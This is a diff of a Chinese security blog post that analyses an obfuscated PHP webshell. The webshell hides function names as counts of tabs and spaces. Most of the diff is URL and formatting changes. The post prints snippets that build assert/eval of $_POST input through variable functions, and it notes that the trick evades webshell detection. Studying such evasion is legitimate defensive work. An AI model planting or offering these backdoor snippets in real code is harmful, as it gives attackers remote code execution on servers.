@@ -74,13 +74,13 @@
 <meta name="description" content="知乎上看到一段代码，很隐蔽的webshell，不仅可以过狗，“过人”都没问题。 对代码进行分析：读取本文件内容，按行放入数组中。分两部分，前15行和后面的。正则是关键，寻找Tab和空格加回车换行。按照Tab键数和空格数组成16进制数，转10进制，再转ASCII码为字符。如：6个Tab+1个空格，61h，10进制97，’a’$r就作为了函数名，eval($_POST[‘123’]);中的eval 对">
 <meta property="og:type" content="article">
 <meta property="og:title" content="可以&quot;过人&quot;的变形webshell">
-<meta property="og:url" content="http://www.cuittk.cn/2018/11/10/变形webshell/index.html">
+<meta property="og:url" content="https://blog.cuittk.cn/2018/11/10/变形webshell/index.html">
 <meta property="og:site_name" content="h1tler&#39;s blog">
 <meta property="og:description" content="知乎上看到一段代码，很隐蔽的webshell，不仅可以过狗，“过人”都没问题。 对代码进行分析：读取本文件内容，按行放入数组中。分两部分，前15行和后面的。正则是关键，寻找Tab和空格加回车换行。按照Tab键数和空格数组成16进制数，转10进制，再转ASCII码为字符。如：6个Tab+1个空格，61h，10进制97，’a’$r就作为了函数名，eval($_POST[‘123’]);中的eval 对">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/v211000.jpg">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/mlp7vuw68w8qied4dw8nv69h8s.png">
-<meta property="og:updated_time" content="2018-11-10T09:12:33.387Z">
+<meta property="og:updated_time" content="2020-02-26T10:39:07.191Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="可以&quot;过人&quot;的变形webshell">
 <meta name="twitter:description" content="知乎上看到一段代码，很隐蔽的webshell，不仅可以过狗，“过人”都没问题。 对代码进行分析：读取本文件内容，按行放入数组中。分两部分，前15行和后面的。正则是关键，寻找Tab和空格加回车换行。按照Tab键数和空格数组成16进制数，转10进制，再转ASCII码为字符。如：6个Tab+1个空格，61h，10进制97，’a’$r就作为了函数名，eval($_POST[‘123’]);中的eval 对">
@@ -114,12 +114,12 @@
 
 
 
-  <link rel="canonical" href="http://www.cuittk.cn/2018/11/10/变形webshell/"/>
+  <link rel="canonical" href="https://blog.cuittk.cn/2018/11/10/变形webshell/"/>
 
 
 
 
-
+<link rel="stylesheet" href="/js/prism/prism.css">
   <title>可以"过人"的变形webshell | h1tler's blog</title>
   
 
@@ -257,7 +257,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2018/11/10/变形webshell/">
+    <link itemprop="mainEntityOfPage" href="https://blog.cuittk.cn/2018/11/10/变形webshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="h1tler">
@@ -353,10 +353,21 @@
       
         <p>知乎上看到一段代码，很隐蔽的webshell，不仅可以过狗，“过人”都没问题。<br><img src="http://img.cdn.cuittk.cn/v211000.jpg" alt=""></p>
 <h3 id="对代码进行分析："><a href="#对代码进行分析：" class="headerlink" title="对代码进行分析："></a>对代码进行分析：</h3><p>读取本文件内容，按行放入数组中。<br>分两部分，前15行和后面的。<br>正则是关键，寻找Tab和空格加回车换行。<br>按照Tab键数和空格数组成16进制数，转10进制，再转ASCII码为字符。<br>如：6个Tab+1个空格，61h，10进制97，’a’<br>$r就作为了函数名，eval($_POST[‘123’]);中的eval</p>
-<h3 id="对于-t"><a href="#对于-t" class="headerlink" title="对于$t()"></a>对于$t()</h3><p><a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。<br>试了半天为什么eval不行，原来eval不是函数，参考柠檬师傅的<a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html" target="_blank" rel="external">文章</a><br>使用assert可以。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$a = &quot;assert&quot;;</div><div class="line">$a(&quot;phpinfo()&quot;);</div></pre></td></tr></table></figure></p>
-<h3 id="利用实现"><a href="#利用实现" class="headerlink" title="利用实现"></a>利用实现</h3><p>$r构造成assert，$c构造成$_POST[‘ppp’]。<br>本地复现时，不行。但是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$a = &quot;assert&quot;;</div><div class="line">$a(&quot;$_POST[ppp]&quot;);</div></pre></td></tr></table></figure></p>
-<p>这样可以，发现后面一句的$_POST[ppp]先执行，如传入：ppp=phpinfo(); 上面语句是assert(“phpinfo();”);<br>$c传入的是字符串，相当于$_POST[ppp];<br>那么传入eval($_POST[ppp])字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$a = &quot;assert&quot;;</div><div class="line">$a(&quot;eval(\$_POST[ppp])&quot;);</div></pre></td></tr></table></figure></p>
-<p>综述：$r构造成”assert”，$c构造成”eval($_POST[ppp])”。<br>对代码改进一下，不用单引号连接，直接使用可变函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$r(&quot;$c&quot;);</div></pre></td></tr></table></figure></p>
+<h3 id="对于-t"><a href="#对于-t" class="headerlink" title="对于$t()"></a>对于$t()</h3><p><a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。<br>试了半天为什么eval不行，原来eval不是函数，参考柠檬师傅的<a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html" target="_blank" rel="external">文章</a><br>使用assert可以。</p>
+<pre><code class="language-php">$a = &quot;assert&quot;;
+$a(&quot;phpinfo()&quot;);
+</code></pre>
+<h3 id="利用实现"><a href="#利用实现" class="headerlink" title="利用实现"></a>利用实现</h3><p>$r构造成assert，$c构造成$_POST[‘ppp’]。<br>本地复现时，不行。但是</p>
+<pre><code class="language-php">$a = &quot;assert&quot;;
+$a(&quot;$_POST[ppp]&quot;);
+</code></pre>
+<p>这样可以，发现后面一句的$_POST[ppp]先执行，如传入：ppp=phpinfo(); 上面语句是assert(“phpinfo();”);<br>$c传入的是字符串，相当于$_POST[ppp];<br>那么传入eval($_POST[ppp])字符串。</p>
+<pre><code class="language-php">$a = &quot;assert&quot;;
+$a(&quot;eval(\$_POST[ppp])&quot;);
+</code></pre>
+<p>综述：$r构造成”assert”，$c构造成”eval($_POST[ppp])”。<br>对代码改进一下，不用单引号连接，直接使用可变函数。</p>
+<pre><code class="language-php">$r(&quot;$c&quot;);
+</code></pre>
 <p><img src="http://img.cdn.cuittk.cn/mlp7vuw68w8qied4dw8nv69h8s.png" alt=""></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>思路够骚，用到了Tab加空格，可变函数。没有敏感关键字，对于代码层的拦截webshell可绕过。</p>
 <p>参考：<br><a href="https://www.zhihu.com/question/68591788/answer/269545371" target="_blank" rel="external">https://www.zhihu.com/question/68591788/answer/269545371</a><br><a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html" target="_blank" rel="external">https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html</a></p>
@@ -478,7 +489,7 @@
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -606,7 +617,7 @@
 
 
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
+<script src="/js/prism/prism.js" async></script>
         
 <div class="busuanzi-count">
   <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
